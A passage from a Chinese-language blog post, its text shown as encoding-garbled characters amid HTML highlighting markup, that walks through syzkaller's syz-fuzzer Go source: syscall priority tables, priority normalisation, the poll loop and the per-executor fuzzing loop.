:= a.Elem.(*ArrayType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, arr.Elem.Name())<br>&#125;<br><span class="hljs-keyword">case</span> *BufferType:<br><span class="hljs-keyword">switch</span> a.Kind &#123;<br><span class="hljs-keyword">case</span> BufferBlobRand, BufferBlobRange, BufferText, BufferCompressed:<br><span class="hljs-keyword">case</span> BufferString, BufferGlob:<br><span class="hljs-keyword">if</span> a.SubKind != <span class="hljs-string">&quot;&quot;</span> &#123;<br>noteUsage(uses, c, <span class="hljs-number">2</span>, ctx.Dir, fmt.Sprintf(<span class="hljs-string">&quot;str-%v&quot;</span>, a.SubKind))<br>&#125;<br><span class="hljs-keyword">case</span> BufferFilename:<br>noteUsage(uses, c, <span class="hljs-number">10</span>, DirIn, <span class="hljs-string">&quot;filename&quot;</span>)<br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown buffer kind&quot;</span>)<br>&#125;<br><span class="hljs-keyword">case</span> *VmaType:<br>noteUsage(uses, c, <span class="hljs-number">5</span>, ctx.Dir, <span class="hljs-string">&quot;vma&quot;</span>)<br><span class="hljs-keyword">case</span> *IntType:<br><span class="hljs-keyword">switch</span> a.Kind &#123;<br><span class="hljs-keyword">case</span> IntPlain, IntRange:<br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown int kind&quot;</span>)<br>&#125;<br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¤§é‡ç”¨åˆ°äº† <code>noteUsage()</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°å…¶å®å°±æ˜¯ç”¨æ¥<strong>æ›´æ–°ä¼ å…¥çš„è¡¨ä¸­ X åˆ° Y çš„æƒé‡å€¼</strong>ï¼ˆå–æœ€å¤§å€¼ï¼‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">noteUsage</span><span class="hljs-params">(uses <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights, c *Syscall, weight <span class="hljs-type">int32</span>, dir Dir, str <span class="hljs-type">string</span>, args ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>id := fmt.Sprintf(str, args...)<br><span class="hljs-keyword">if</span> uses[id] == <span class="hljs-literal">nil</span> &#123;<br>uses[id] = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights)<br>&#125;<br>callWeight := uses[id][c.ID]<br>callWeight.call = c.ID<br><span class="hljs-keyword">if</span> dir != DirOut &#123;<br><span class="hljs-keyword">if</span> weight &gt; uses[id][c.ID].in &#123;<br>callWeight.in = weight<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> weight &gt; uses[id][c.ID].inout &#123;<br>callWeight.inout = weight<br>&#125;<br>uses[id][c.ID] = callWeight<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Step-II-å»ºç«‹-call-to-call-çš„æƒé‡è¡¨"><a href="#Step-II-å»ºç«‹-call-to-call-çš„æƒé‡è¡¨" class="headerlink" title="Step.II - å»ºç«‹ call-to-call çš„æƒé‡è¡¨"></a>Step.II - å»ºç«‹ call-to-call çš„æƒé‡è¡¨</h5><p>ç°åœ¨æˆ‘ä»¬å›åˆ° <code>calcStaticPriorities()</code> ä¸­ï¼Œåœ¨å®Œæˆäº†èµ„æºä½¿ç”¨è¡¨ <code>uses</code> çš„å»ºç«‹ä¹‹åï¼Œæ¥ä¸‹æ¥ä¼šå»ºç«‹ call-to-call çš„æƒé‡è¡¨ <code>prios</code>ï¼š</p><ul><li>éå†èµ„æºä½¿ç”¨è¡¨ä¸­çš„æ¯ä¸ªæƒé‡ï¼ŒåŸºäºå‚æ•°æ–¹å‘èµ‹äºˆé™æ€æƒé‡å€¼ï¼ˆä¾‹å¦‚ï¼Œå½“ c0 ä¸ºåˆ›å»ºäº†ä¸€ä¸ªèµ„æºçš„è°ƒç”¨ï¼Œè€Œ c1 ä¸ºä½¿ç”¨è¯¥èµ„æºçš„è°ƒç”¨ï¼Œåˆ™ä¸€ä¸ªæ›´é«˜çš„æƒé‡å°†è¢«èµ‹äºˆï¼‰</li><li>è°ƒç”¨ <code>normalizePrio()</code> å°†è¡¨ä¸­æƒé‡å€¼è¿›è¡Œæ ‡å‡†åŒ–</li><li>å¯¹äºè‡ªæˆ‘ç³»ç»Ÿè°ƒç”¨æƒé‡è¿›è¡Œå•ç‹¬èµ‹å€¼</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go">prios := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> prios &#123;<br>prios[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br>&#125;<br><span class="hljs-keyword">for</span> _, weights := <span class="hljs-keyword">range</span> uses &#123;<br><span class="hljs-keyword">for</span> _, w0 := <span class="hljs-keyword">range</span> weights &#123;<br><span class="hljs-keyword">for</span> _, w1 := <span class="hljs-keyword">range</span> weights &#123;<br><span class="hljs-keyword">if</span> w0.call == w1.call &#123;<br><span class="hljs-comment">// è‡ªèº«æƒé‡åœ¨ä¸‹æ–¹èµ‹å€¼.</span><br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// é™æ€æƒé‡å€¼åŸºäºå‚æ•°æ–¹å‘èµ‹å€¼.å½“ c0 ä¸ºåˆ›å»ºäº†ä¸€ä¸ªèµ„æºçš„è°ƒç”¨</span><br><span class="hljs-comment">// è€Œ c1 ä¸ºä½¿ç”¨è¯¥èµ„æºçš„è°ƒç”¨ï¼Œåˆ™ä¸€ä¸ªæ›´é«˜çš„æƒé‡å°†è¢«èµ‹äºˆ.</span><br>prios[w0.call][w1.call] += w0.inout*w1.in*<span class="hljs-number">3</span>/<span class="hljs-number">2</span> + w0.inout*w1.inout<br>&#125;<br>&#125;<br>&#125;<br>normalizePrio(prios)<br><span class="hljs-comment">// è‡ªèº«æƒé‡å€¼(call wrt itself) çš„èµ‹å€¼åº”å½“é«˜äº›, ä½†ä¸è¦å¤ªé«˜.</span><br><span class="hljs-keyword">for</span> c0, pp := <span class="hljs-keyword">range</span> prios &#123;<br>pp[c0] = prioHigh * <span class="hljs-number">9</span> / <span class="hljs-number">10</span><br>&#125;<br><span class="hljs-keyword">return</span> prios<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ŒæˆåŸºäºèµ„æºä½¿ç”¨çš„æƒé‡å€¼è®¡ç®—ä¹‹åé™æ€ä¼˜å…ˆçº§å°±ç®—è®¡ç®—å®Œæ¯•äº†ï¼šï¼‰</p><h4 id="â‘¡-calcDynamicPrio-ï¼šåŠ¨æ€ä¼˜å…ˆçº§è®¡ç®—"><a href="#â‘¡-calcDynamicPrio-ï¼šåŠ¨æ€ä¼˜å…ˆçº§è®¡ç®—" class="headerlink" title="â‘¡ calcDynamicPrio()ï¼šåŠ¨æ€ä¼˜å…ˆçº§è®¡ç®—"></a>â‘¡ calcDynamicPrio()ï¼šåŠ¨æ€ä¼˜å…ˆçº§è®¡ç®—</h4><p>åŠ¨æ€ä¼˜å…ˆçº§çš„è®¡ç®—åŸºäºç°æœ‰çš„è¯­æ–™åº“å®Œæˆï¼Œè¿™ä¸€éƒ¨åˆ†çš„ä»£ç æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯éå†è¯­æ–™åº“ï¼Œå¯¹äºåŒæ—¶å‡ºç°çš„ç³»ç»Ÿè°ƒç”¨å¯¹ Xã€Y çš„ä¼˜å…ˆçº§å€¼ <code>+1</code>ï¼Œå®Œæˆåè°ƒç”¨ <code>normalizePrio()</code> è¿›è¡Œæ ‡å‡†åŒ–ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcDynamicPrio(corpus []*Prog) [][]<span class="hljs-type">int32</span> &#123;<br>prios := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> prios &#123;<br>prios[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br>&#125;<br><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> corpus &#123;<br><span class="hljs-keyword">for</span> idx0, c0 := <span class="hljs-keyword">range</span> p.Calls &#123;<br><span class="hljs-keyword">for</span> _, c1 := <span class="hljs-keyword">range</span> p.Calls[idx0+<span class="hljs-number">1</span>:] &#123;<br>prios[c0.Meta.ID][c1.Meta.ID]++<br>&#125;<br>&#125;<br>&#125;<br>normalizePrio(prios)<br><span class="hljs-keyword">return</span> prios<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="â‘¢-normalizePrio-ï¼šä¼˜å…ˆçº§å€¼æ ‡å‡†åŒ–"><a href="#â‘¢-normalizePrio-ï¼šä¼˜å…ˆçº§å€¼æ ‡å‡†åŒ–" class="headerlink" title="â‘¢ normalizePrio()ï¼šä¼˜å…ˆçº§å€¼æ ‡å‡†åŒ–"></a>â‘¢ normalizePrio()ï¼šä¼˜å…ˆçº§å€¼æ ‡å‡†åŒ–</h4><p>è¿™ä¸ªå‡½æ•°é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯å°†æƒé‡å€¼æ ‡å‡†åŒ–åˆ° [prioLow..prioHigh] èŒƒå›´ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>prioLow  = <span class="hljs-number">10</span><br>prioHigh = <span class="hljs-number">1000</span><br>)<br><br><span class="hljs-comment">// normalizePrio å°†æƒé‡å€¼æ ‡å‡†åŒ–åˆ° [prioLow..prioHigh] èŒƒå›´.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">normalizePrio</span><span class="hljs-params">(prios [][]<span class="hljs-type">int32</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> _, prio := <span class="hljs-keyword">range</span> prios &#123;<br>max := <span class="hljs-type">int32</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> prio &#123;<br><span class="hljs-keyword">if</span> max &lt; p &#123;<br>max = p<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> i, p := <span class="hljs-keyword">range</span> prio &#123;<br>prio[i] = prioLow + p*(prioHigh-prioLow)/max<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="ä¸ºæ¯ä¸ª-syz-executor-å¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œæ­£å¼å¼€å§‹-fuzz"><a href="#ä¸ºæ¯ä¸ª-syz-executor-å¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œæ­£å¼å¼€å§‹-fuzz" class="headerlink" title="ä¸ºæ¯ä¸ª syz-executor å¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œæ­£å¼å¼€å§‹ fuzz"></a>ä¸ºæ¯ä¸ª syz-executor å¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œæ­£å¼å¼€å§‹ fuzz</h2><p>å®Œæˆå‰é¢çš„æ‰€æœ‰å‡†å¤‡å·¥ä½œä¹‹åï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç»ˆäºå¯ä»¥æ­£å¼å¼€å§‹è¿›è¡Œ fuzzing äº†ï¼Œsyz-fuzzer ä¼šè°ƒç”¨ <code>newProc()</code> ä¸ºæ¯ä¸ªè¦å¯åŠ¨çš„ syz-executor åˆ›å»ºä¸€ä¸ª <code>Proc</code> å®ä¾‹å¯¹è±¡ï¼ˆéƒ½å­˜æ”¾åœ¨ <code>fuzzer.procs</code> åˆ—è¡¨ä¸­ï¼‰ï¼Œå¹¶<strong>ä¸ºæ¯ä¸ª syz-executor å¯åŠ¨ä¸€ä¸ªæ–°çš„åç¨‹è´Ÿè´£å…·ä½“çš„ fuzzing å·¥ä½œ</strong>ï¼ˆ<code>proc.Loop()</code>ï¼‰</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> r.CoverFilterBitmap != <span class="hljs-literal">nil</span> &#123;<br>fuzzer.execOpts.Flags |= ipc.FlagEnableCoverageFilter<br>&#125;<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;starting %v fuzzer processes&quot;</span>, *flagProcs)<br><span class="hljs-keyword">for</span> pid := <span class="hljs-number">0</span>; pid &lt; *flagProcs; pid++ &#123;<br>proc, err := newProc(fuzzer, pid)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create proc: %v&quot;</span>, err)<br>&#125;<br>fuzzer.procs = <span class="hljs-built_in">append</span>(fuzzer.procs, proc)<br><span class="hljs-keyword">go</span> proc.loop()<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æœ€åä¸»çº¿ç¨‹è°ƒç”¨ <code>pollLoop()</code>ï¼Œå¾ªç¯ç­‰å¾…éœ€è¦ poll çš„æƒ…å†µ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">fuzzer.pollLoop()<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-pollLooop-ï¼šå¾ªç¯ç­‰å¾…å¤„ç†-fuzzing-åç¨‹è¯·æ±‚ï¼Œä¸-syz-manager-é€šä¿¡"><a href="#0x03-pollLooop-ï¼šå¾ªç¯ç­‰å¾…å¤„ç†-fuzzing-åç¨‹è¯·æ±‚ï¼Œä¸-syz-manager-é€šä¿¡" class="headerlink" title="0x03. pollLooop()ï¼šå¾ªç¯ç­‰å¾…å¤„ç† fuzzing åç¨‹è¯·æ±‚ï¼Œä¸ syz-manager é€šä¿¡"></a>0x03. pollLooop()ï¼šå¾ªç¯ç­‰å¾…å¤„ç† fuzzing åç¨‹è¯·æ±‚ï¼Œä¸ syz-manager é€šä¿¡</h1><p>fuzzing çš„å·¥ä½œæ˜¯ç”±åç¨‹ <code>proc.loop()</code> å®Œæˆçš„ï¼Œåœ¨ç»§ç»­æ·±å…¥ fuzzing è¿‡ç¨‹ä¹‹å‰æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ä¸»çº¿ç¨‹æœ€åè¿˜ä¼šåšäº›ä»€ä¹ˆï¼šï¼‰</p><p>ä¸»çº¿ç¨‹åœ¨å¯åŠ¨è¿™äº›åç¨‹ä¹‹åæ‰€éœ€è¦åšçš„å·¥ä½œå…¶å®å°±æ˜¯å“åº”è¿™äº›åç¨‹çš„è¯·æ±‚ï¼Œå¹¶è´Ÿè´£ä¸ syz-manager é—´è¿›è¡Œ RPC é€šä¿¡ï¼Œé€šè¿‡ä¸€ä¸ªä¸ä¼šè¿”å›çš„ <code>pollLoop()</code> å‡½æ•°å®Œæˆï¼Œè¯¥å‡½æ•°æ ¸å¿ƒå…¶å®å°±æ˜¯ä¸€ä¸ª<strong>æ— é™å¾ªç¯</strong>ï¼š</p><ul><li>å¾ªç¯ç­‰å¾… <code>ticker</code> ï¼ˆæ¯ 3s å“åº”ä¸€æ¬¡çš„è®¡æ—¶å™¨ï¼‰æˆ– <code>fuzzer.needPoll</code> è¿™ä¸¤ä¸ª channel ä¹‹ä¸€æœ‰æ•°æ®ä¼ æ¥</li><li>å¦‚æœæ˜¯  <code>fuzzer.needPoll</code> ä¼ æ¥è¯·æ±‚æˆ–æ˜¯è·ç¦»ä¸Šæ¬¡ poll çš„æ—¶é—´å¤§äº 10sï¼š<ul><li>æ£€æŸ¥ workQueue æ˜¯å¦éœ€è¦æ–°çš„ candidateï¼ˆcandidate æ•°é‡å°‘äº executor æ•°é‡ï¼‰ï¼Œè‹¥ä¸æ˜¯ä¸”æœ¬æ¬¡è¯·æ±‚å¤„ç†ä¸º  <code>fuzzer.needPoll</code> ä¼ æ¥è¯·æ±‚ï¼Œåˆ™ç­‰åˆ°åˆ°è·ç¦»ä¸Šæ¬¡ poll çš„æ—¶é—´å¤§äº 10s</li><li>æ”¶é›† executor æ•°æ®ï¼Œè°ƒç”¨ <code>poll()</code> é€šè¿‡ RPC å‘ syz-manager è·å–æ–°çš„ candidate</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go">unc (fuzzer *Fuzzer) pollLoop() &#123;<br><span class="hljs-keyword">var</span> execTotal <span class="hljs-type">uint64</span><br><span class="hljs-keyword">var</span> lastPoll time.Time<br><span class="hljs-keyword">var</span> lastPrint time.Time<br>ticker := time.NewTicker(<span class="hljs-number">3</span> * time.Second * fuzzer.timeouts.Scale).C<br><span class="hljs-keyword">for</span> &#123;<br>poll := <span class="hljs-literal">false</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ticker:<span class="hljs-comment">/* 3s ä¸€æ¬¡çš„è®¡æ—¶å™¨ */</span><br><span class="hljs-keyword">case</span> &lt;-fuzzer.needPoll: <span class="hljs-comment">/* fuzzing åç¨‹çš„ poll è¯·æ±‚ */</span><br>poll = <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> fuzzer.outputType != OutputStdout &amp;&amp; time.Since(lastPrint) &gt; <span class="hljs-number">10</span>*time.Second*fuzzer.timeouts.Scale &#123;<br><span class="hljs-comment">// Keep-alive for manager.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;alive, executed %v&quot;</span>, execTotal)<br>lastPrint = time.Now()<br>&#125;<br><span class="hljs-comment">/* å¯¹äºè®¡æ—¶å™¨è€Œè¨€è‡³å°‘ 10s æ‰ poll ä¸€æ¬¡ */</span><br><span class="hljs-keyword">if</span> poll || time.Since(lastPoll) &gt; <span class="hljs-number">10</span>*time.Second*fuzzer.timeouts.Scale &#123;<br><span class="hljs-comment">/* workqueue é‡Œ work item æ•°é‡å°‘äº executor æ•°é‡æ‰ poll */</span><br>needCandidates := fuzzer.workQueue.wantCandidates()<br><span class="hljs-keyword">if</span> poll &amp;&amp; !needCandidates &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>stats := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span>)<br><span class="hljs-keyword">for</span> _, proc := <span class="hljs-keyword">range</span> fuzzer.procs &#123;<br>stats[<span class="hljs-string">&quot;exec total&quot;</span>] += atomic.SwapUint64(&amp;proc.env.StatExecs, <span class="hljs-number">0</span>)<br>stats[<span class="hljs-string">&quot;executor restarts&quot;</span>] += atomic.SwapUint64(&amp;proc.env.StatRestarts, <span class="hljs-number">0</span>)<br>&#125;<br><span class="hljs-keyword">for</span> stat := Stat(<span class="hljs-number">0</span>); stat &lt; StatCount; stat++ &#123;<br>v := atomic.SwapUint64(&amp;fuzzer.stats[stat], <span class="hljs-number">0</span>)<br>stats[statNames[stat]] = v<br>execTotal += v<br>&#125;<br><span class="hljs-keyword">if</span> !fuzzer.poll(needCandidates, stats) &#123;<br>lastPoll = time.Now()<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-proc-loop-ï¼šçœŸæ­£è´Ÿè´£-fuzzing-çš„æ ¸å¿ƒåç¨‹"><a href="#0x04-proc-loop-ï¼šçœŸæ­£è´Ÿè´£-fuzzing-çš„æ ¸å¿ƒåç¨‹" class="headerlink" title="0x04. proc.loop()ï¼šçœŸæ­£è´Ÿè´£ fuzzing çš„æ ¸å¿ƒåç¨‹"></a>0x04. proc.loop()ï¼šçœŸæ­£è´Ÿè´£ fuzzing çš„æ ¸å¿ƒåç¨‹</h1><p>ä¸‹é¢æˆ‘ä»¬æ¥åˆ° syz-fuzzer çš„å¦ä¸€ä¸ªæ ¸å¿ƒâ€”â€”<strong>çœŸæ­£çš„ fuzzing è¿‡ç¨‹</strong>ï¼Œsyz-fuzzer ä¼šä¸ºæ¯ä¸ª syz-executor å¯åŠ¨ä¸€ä¸ªæ–°çš„åç¨‹è´Ÿè´£å…·ä½“çš„ fuzzing å·¥ä½œï¼ˆå¯¹äº executor æ¥è¯´ç›¸å½“äºç£å·¥å’Œä¸æ–­ç»™ä»»åŠ¡çš„ä¸Šå¸å±äºæ˜¯ï¼‰ï¼Œè¯¥åç¨‹å¯¹åº” <code>proc.loop()</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°çš„æ ¸å¿ƒå…¶å®è¿˜æ˜¯ä¸€ä¸ª<strong>æ— é™å¾ªç¯</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> loop() &#123;<br>generatePeriod := <span class="hljs-number">100</span><br><span class="hljs-keyword">if</span> proc.fuzzer.config.Flags&amp;ipc.FlagSignal == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// å¦‚æœæˆ‘ä»¬æ²¡æœ‰çœŸçš„è¦†ç›–ç‡ä¿¡å·, æ›´åŠ é¢‘ç¹åœ°ç”Ÿæˆç¨‹åº</span><br><span class="hljs-comment">// å› ä¸ºåé¦ˆä¿¡å·å¾ˆå¼±.</span><br>generatePeriod = <span class="hljs-number">2</span><br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ &#123;<br></code></pre></td></tr></table></figure><h2 id="ä»å…¨å±€-WorkQueue-ä¸­è·å–è¾“å…¥ï¼Œåˆ†ç±»å¤„ç†æ‰§è¡Œ"><a href="#ä»å…¨å±€-WorkQueue-ä¸­è·å–è¾“å…¥ï¼Œåˆ†ç±»å¤„ç†æ‰§è¡Œ" class="headerlink" title="ä»å…¨å±€ WorkQueue ä¸­è·å–è¾“å…¥ï¼Œåˆ†ç±»å¤„ç†æ‰§è¡Œ"></a>ä»å…¨å±€ WorkQueue ä¸­è·å–è¾“å…¥ï¼Œåˆ†ç±»å¤„ç†æ‰§è¡Œ</h2><p>å¤§å¾ªç¯çš„æ ¸å¿ƒé€»è¾‘ä¹‹ä¸€ä¸ºä¸æ–­åœ°ä»å…¨å±€ <code>WorkQueue</code> ä¸­è·å–æ–°çš„è¾“å…¥ï¼ŒæŒ‰ç…§å…¶ç±»å‹ä¸åŒè°ƒç”¨ä¸åŒçš„å¤„ç†å‡½æ•°ï¼Œå®Œæˆååˆç»§ç»­ä¸‹ä¸€è½®å¾ªç¯</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go">item := proc.fuzzer.workQueue.dequeue()<br><span class="hljs-keyword">if</span> item != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">switch</span> item := item.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *WorkTriage:<br>proc.triageInput(item)<br><span class="hljs-keyword">case</span> *WorkCandidate:<br>proc.execute(proc.execOpts, item.p, item.flags, StatCandidate)<br><span class="hljs-keyword">case</span> *WorkSmash:<br>proc.smashInput(item)<br><span class="hljs-keyword">default</span>:<br>log.Fatalf(<span class="hljs-string">&quot;unknown work type: %#v&quot;</span>, item)<br>&#125;<br><span class="hljs-keyword">continue</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="â‘ -proc-triageInput-ï¼šæ‰§è¡Œè¾“å…¥-amp-å°è¯•æœ€å°åŒ–åå‘é€ç»™-manager-å¹¶æ·»åŠ åˆ°æœ¬åœ°è¯­æ–™åº“ï¼Œè‹¥æœª-smash-åˆ™æ·»åŠ åˆ°-smash-é˜Ÿåˆ—"><a href="#â‘ -proc-triageInput-ï¼šæ‰§è¡Œè¾“å…¥-amp-å°è¯•æœ€å°åŒ–åå‘é€ç»™-manager-å¹¶æ·»åŠ åˆ°æœ¬åœ°è¯­æ–™åº“ï¼Œè‹¥æœª-smash-åˆ™æ·»åŠ åˆ°-smash-é˜Ÿåˆ—" class="headerlink" title="â‘  proc.triageInput()ï¼šæ‰§è¡Œè¾“å…¥&amp;å°è¯•æœ€å°åŒ–åå‘é€ç»™ manager å¹¶æ·»åŠ åˆ°æœ¬åœ°è¯­æ–™åº“ï¼Œè‹¥æœª smash åˆ™æ·»åŠ åˆ° smash é˜Ÿåˆ—"></a>â‘  proc.triageInput()ï¼šæ‰§è¡Œè¾“å…¥&amp;å°è¯•æœ€å°åŒ–åå‘é€ç»™ manager å¹¶æ·»åŠ åˆ°æœ¬åœ°è¯­æ–™åº“ï¼Œè‹¥æœª smash åˆ™æ·»åŠ åˆ° smash é˜Ÿåˆ—</h3><p>è¯¥å‡½æ•°ç”¨æ¥å¤„ç† WorkQueue ä¸­çš„ WorkTraigeï¼Œå³<strong>å¯èƒ½ä¼šæä¾›æ–°è¦†ç›–ç‡çš„ç¨‹åº</strong>ï¼š</p><ul><li>ä¸€å¼€å§‹å…ˆè°ƒç”¨ <code>signalPrio()</code> æ£€æŸ¥è¯¥è¾“å…¥ä¹‹å‰æ‰§è¡Œç»“æœçš„ <code>errno</code>ï¼Œä¸º <code>0</code> åˆ™ <code>prio |= 1 &lt;&lt; 1</code>ï¼ŒåŒæ—¶è¿˜ä¼šæ£€æŸ¥æ˜¯å¦ <code>item.p</code> çš„ <code>target</code> ä¸åŒ…å« <code>item.p.Calls[call]</code> å¯¹åº”çš„è°ƒç”¨ï¼Œè‹¥æ˜¯åˆ™ <code>prio |= 1 &lt;&lt; 0</code></li><li>åˆ¤æ–­æ˜¯å¦äº§ç”Ÿäº†è¯­æ–™åº“ä¸­æ²¡æœ‰çš„æ–°ä¿¡å·ï¼Œè‹¥æ— 